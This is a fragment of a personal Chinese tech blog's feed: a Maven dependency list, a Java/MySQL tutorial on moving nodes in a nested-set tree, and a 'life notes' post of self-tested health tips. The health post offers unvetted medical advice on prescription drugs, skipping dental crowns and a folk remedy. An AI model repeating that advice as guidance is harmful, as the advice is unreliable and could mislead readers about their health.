class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-web&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-jdbc&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;            &amp;lt;groupId&amp;gt;com.baomidou&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;            &amp;lt;artifactId&amp;gt;mybatis-plus-boot-starter&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;            &amp;lt;version&amp;gt;$&amp;#123;mybatis-plus.version&amp;#125;&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;        &amp;lt;/dependency&amp;gt; --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;mysql&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;mysql-connector-java&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/org.apache.shardingsphere/sharding-jdbc-spring-boot-starter --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.apache.shardingsphere&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;shardingsphere-jdbc-core-spring-boot-starter&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;5.0.0&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		 &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.baomidou&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		 &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;mybatis-plus-boot-starter&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		 &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;$&amp;#123;mybatis-plus.version&amp;#125;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	 &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-actuator&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;exclusions&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;exclusion&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;exclusion&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;exclusion&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.fasterxml.jackson.core&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;jackson-databind&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;exclusion&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;exclusions&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="JAVA" scheme="https://reiner.host/categories/JAVA/"/>
    
    
    <category term="JAVA" scheme="https://reiner.host/tags/JAVA/"/>
    
    <category term="分表" scheme="https://reiner.host/tags/%E5%88%86%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>生活笔记之日常生活中的科学养生</title>
    <link href="https://reiner.host/posts/210f1a3e.html"/>
    <id>https://reiner.host/posts/210f1a3e.html</id>
    <published>2021-07-06T07:02:52.000Z</published>
    <updated>2023-03-09T12:16:40.246Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="说明">说明</span></h1><p>  此文章为个人经验总结，纯当自用笔记(<del>反正也没人看</del>)，每个人的体质和情况各不相同，不保证对每个人都有效。</p><p>某伟人曾说过：身体是革命的本钱，钱没了还可以再嫌，人病了那就人财两空了。</p><h1><span id="口腔溃疡">口腔溃疡</span></h1><p> 口腔溃疡一般是由于饮食不均衡导致的，在外漂泊的打工人多数没有条件自己做饭，吃外卖又容易营养不均衡，解决办法如下：</p><ul><li>常备维生素B族(10块钱一瓶的那种，不要买保健品！)，药店里有，千万不要买那些几十几百的，都是智商税，感觉有点溃疡的苗头时就要提前吃，或者每周定期吃。</li><li>酸奶，冰箱里常备酸奶，饭后来一杯，酸奶含有多种人体所需维生素，正好弥补吃外卖饮食不均衡问题</li></ul><p>自此以后再也不怕口腔溃疡啦！</p><span id="more"></span><h1><span id="脱发问题">脱发问题</span></h1><p>  重要的东西放在前面讲，这个问题恐怕是所有人（不分男女）的恶梦了，本人试过很多所谓的偏方，包括什么黑芝麻、霸王、德国防脱发洗发水等等</p><p><strong>统统没有用！</strong>  首先需要排除是由于压力过大或者斑秃导致的脱发，如果不是这两个原因导致的，那么八成是溢脂性脱发(雄脱)导致的。</p><p>溢脂性脱发多为遗传因素，缓解方法有如下：</p><ul><li>植发 （贵得一比）</li><li>非那雄胺口服药（有副作用）</li><li>外用米诺地尔（似乎是最好的选择了，亲测有用，但需要长期使用）</li></ul><h1><span id="长痘问题">长痘问题</span></h1><p>长痘一般是皮肤出油导致，出油又容易导致面部细菌繁殖，解决办法如下：</p><ul><li>搞个最便宜的氨基酸洗面奶每晚清洗（有钱随意）洗净表面的油</li><li>保湿，买点保湿的护肤品每天使用，出油是因为皮肤干燥，不要买面膜，糙汉子直接买最便宜的（大宝、北京标婷）就够用</li><li>枕头问题，我比较喜欢侧身睡，然而之前的枕头太软，侧身睡导致鼻子附近都贴着枕头了，再加上鼻子附近又容易出油，结果导致细菌繁殖因而天天长痘，因此如果要侧身睡枕头不要太软。</li><li>涂护肤品前手洗干净不要摸其它东西防止细菌污染</li><li>维A酸乳膏，减少出油用，每晚涂易出油处</li></ul><p><strong>2023-3-9更新</strong><br>  总结一条经验，保持面部干燥无菌就不会长痘，口罩不宜长时间戴，最好勤换，潮湿环境+油皮容易滋生细菌</p><h1><span id="牙齿问题">牙齿问题</span></h1><p>早晚刷牙不用说了，如果已经蛀牙赶紧去补，如果已经没法补了，开始疼了，优先保守治疗，吃药撑一撑，然后每晚刷牙后用牙线清理蛀牙残留</p><p>如果用了牙线清理还是复发了，那没得救了，做根管治疗吧，根管治疗后医生会建议再做个牙冠，然而真的做了牙冠之后会发现那棵牙齿用又不好用，刷又不好刷。</p><p>所以最好的做法是不要做牙冠，就这样凑合着用，能用多久是多久，实在有一天牙齿裂开了拔掉再种牙，原生的牙齿才是最好用的。</p><h1><span id="脚气">脚气</span></h1><p>2023-3-9更新：</p><p>莫名其妙的被传染了，用了一年的曲安奈德乳膏都没好，最后居然PDD买了瓶10块的狼毒喷好了，不得不说传承了千年的医术还是有点用的</p><p>持续更新……</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;  此文章为个人经验总结，纯当自用笔记(&lt;del&gt;反正也没人看&lt;/del&gt;)，每个人的体质和情况各不相同，不保证对每个人都有效。&lt;/p&gt;
&lt;p&gt;某伟人曾说过：身体是革命的本钱，钱没了还可以再嫌，人病了那就人财两空了。&lt;/p&gt;
&lt;h1 id=&quot;口腔溃疡&quot;&gt;&lt;a href=&quot;#口腔溃疡&quot; class=&quot;headerlink&quot; title=&quot;口腔溃疡&quot;&gt;&lt;/a&gt;口腔溃疡&lt;/h1&gt;&lt;p&gt; 口腔溃疡一般是由于饮食不均衡导致的，在外漂泊的打工人多数没有条件自己做饭，吃外卖又容易营养不均衡，解决办法如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常备维生素B族(10块钱一瓶的那种，不要买保健品！)，药店里有，千万不要买那些几十几百的，都是智商税，感觉有点溃疡的苗头时就要提前吃，或者每周定期吃。&lt;/li&gt;
&lt;li&gt;酸奶，冰箱里常备酸奶，饭后来一杯，酸奶含有多种人体所需维生素，正好弥补吃外卖饮食不均衡问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;自此以后再也不怕口腔溃疡啦！&lt;/p&gt;</summary>
    
    
    
    <category term="其它" scheme="https://reiner.host/categories/%E5%85%B6%E5%AE%83/"/>
    
    
    <category term="杂谈" scheme="https://reiner.host/tags/%E6%9D%82%E8%B0%88/"/>
    
    <category term="生活笔记" scheme="https://reiner.host/tags/%E7%94%9F%E6%B4%BB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>左右值树形结构移动节点方法(modified preorder tree traversal move node)</title>
    <link href="https://reiner.host/posts/cfc5b0c5.html"/>
    <id>https://reiner.host/posts/cfc5b0c5.html</id>
    <published>2021-06-17T07:57:37.000Z</published>
    <updated>2021-12-24T12:18:33.140Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="说明">说明</span></h1><p>在之前的文章：<a href="https://reiner.host/posts/9340b114.html">使用左右值树形数据结构实现树形菜单</a> 中记录了如何使用左右值增删改查节点，本次将记录一下如何移动节点，语言使用JAVA + MYSQL实现。</p><p><strong>总体思路</strong></p><p>移动节点的大致思路是记录移动节点和目标节点之间的左右值以及其子节点的左右值，移动节点及其子节点左右值和目标节点及其子节点的左右值相互加减。</p><p><strong>举例</strong></p><p>节点A的左右值是LEFT=1,RIGHT=2，节点B的左右值是LEFT=5,RIGHT=6，现在要将节点A移动到节点B前面，那么它的移动范围就是RIGHT - LEFT + 1，即：2 - 1 +1 = 2，也就是说节点A左右值+2，左右值小于节点B的左右值-2 。</p><p>结果：节点A的LEFT = 3 ,RIGHT = 4，节点B前面的节点左右值减了2变成了LEFT=1,RIGHT=2，相当于和节点A换了个位置，如此来达到移动节点的目的</p><p>后续的移动到节点B后面、移动到节点B作为其子节点思路相同。</p><p><strong>更新</strong></p><p>2021-6-22 更新</p><p>修复了BUG，最新代码请关注： <a href="https://github.com/reinershir/lui-auth">https://github.com/reinershir/lui-auth</a>  以下代码摘抄自菜单管理功能</p><span id="more"></span><h1><span id="代码示例">代码示例</span></h1><h3><span id="移动节点到目标节点的前面">移动节点到目标节点的前面</span></h3><p>将要移动的节点移动动目标节点的前面作为其兄弟节点，为防止在移动节点过程中左右值被修改，需要锁定表，代码示例如下 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: moveNodeBefore</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:  移动菜单到目标菜单前面 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xh</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021年5月29日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> moveId 被移动菜单ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetId 目标菜单ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">moveNodeBefore</span><span class="params">(Long moveId,Long targetId,<span class="keyword">boolean</span> isUnlockTable )</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.lockTable();</span><br><span class="line">   </span><br><span class="line">Menu moveMenu = <span class="keyword">this</span>.selectById(moveId);</span><br><span class="line"></span><br><span class="line">Menu targetMenu = <span class="keyword">this</span>.selectById(targetId);</span><br><span class="line"></span><br><span class="line">Integer nodeLeft = moveMenu.getLeftValue();</span><br><span class="line">Integer nodeRight = moveMenu.getRightValue();</span><br><span class="line"></span><br><span class="line"><span class="comment">//要移动菜单的范围，即被移动菜单及其子节点的左右值范围</span></span><br><span class="line">Integer nodeDist = nodeRight - nodeLeft+<span class="number">1</span>; <span class="comment">//确定要移动的范围</span></span><br><span class="line">Integer level = moveMenu.getLevel();</span><br><span class="line"></span><br><span class="line">Integer targetLeft = targetMenu.getLeftValue();</span><br><span class="line">Integer targetLevel = targetMenu.getLevel();</span><br><span class="line">Integer moveNodeLeft = nodeLeft &lt; targetLeft?nodeLeft:nodeLeft + nodeDist;</span><br><span class="line"><span class="keyword">if</span>((targetLeft&gt;=nodeLeft &amp;&amp; targetLeft&lt;= nodeRight)||(moveId==targetId)) &#123;</span><br><span class="line">unlockTables();</span><br><span class="line"><span class="comment">//is child node</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Integer result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN LEFT_VALUE &gt;= :targetLeft THEN LEFT_VALUE + :nodeDist ELSE LEFT_VALUE END ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN RIGHT_VALUE &gt;= :targetLeft THEN RIGHT_VALUE + :nodeDist ELSE RIGHT_VALUE END &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE RIGHT_VALUE &gt;= :targetLeft&quot;</span>);</span><br><span class="line"></span><br><span class="line">MapSqlParameterSource  params = <span class="keyword">new</span> MapSqlParameterSource();</span><br><span class="line">params.addValue(<span class="string">&quot;nodeLeft&quot;</span>, nodeLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;nodeRight&quot;</span>, nodeRight);</span><br><span class="line">params.addValue(<span class="string">&quot;targetLeft&quot;</span>, targetLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;nodeDist&quot;</span>, nodeDist);</span><br><span class="line"></span><br><span class="line">NamedParameterJdbcTemplate namedParameterJdbcTemplate = <span class="keyword">new</span> NamedParameterJdbcTemplate(jdbcTemplate);</span><br><span class="line"></span><br><span class="line">result+=namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"></span><br><span class="line">sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = LEFT_VALUE + :targetLeft - :moveNodeLeft ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = RIGHT_VALUE + :targetLeft - :moveNodeLeft ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;LEVEL = LEVEL - :level + :targetLevel WHERE LEFT_VALUE &gt;= :moveNodeLeft AND RIGHT_VALUE &lt;= :moveNodeLeft + :nodeDist -1 &quot;</span>);</span><br><span class="line"></span><br><span class="line">params.addValue(<span class="string">&quot;moveNodeLeft&quot;</span>, moveNodeLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;level&quot;</span>, level);</span><br><span class="line">params.addValue(<span class="string">&quot;targetLevel&quot;</span>, targetLevel);</span><br><span class="line">result +=namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"></span><br><span class="line">sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN LEFT_VALUE &gt;= :moveNodeLeft THEN LEFT_VALUE - :nodeDist ELSE LEFT_VALUE END,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN RIGHT_VALUE &gt; :moveNodeLeft THEN RIGHT_VALUE - :nodeDist ELSE RIGHT_VALUE END &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE RIGHT_VALUE &gt; :moveNodeLeft &quot;</span>);</span><br><span class="line"></span><br><span class="line">result+= namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"><span class="keyword">if</span>(isUnlockTable) &#123;</span><br><span class="line">unlockTables();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">moveNodeBefore</span><span class="params">(Long moveId,Long targetId)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> moveNodeBefore(moveId, targetId,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码以移动菜单为例，LEFT_VALUE,RIGHT_VALUE分别对应左值和右值</p><p>lockTables()，mysql锁表代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.update(&quot;<span class="keyword">LOCK</span> <span class="keyword">TABLES</span> <span class="string">&quot;+tableName+&quot;</span> WRITE<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><p>unlockTable() 手动解除锁表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.update(&quot;<span class="keyword">UNLOCK</span> <span class="keyword">TABLES</span> <span 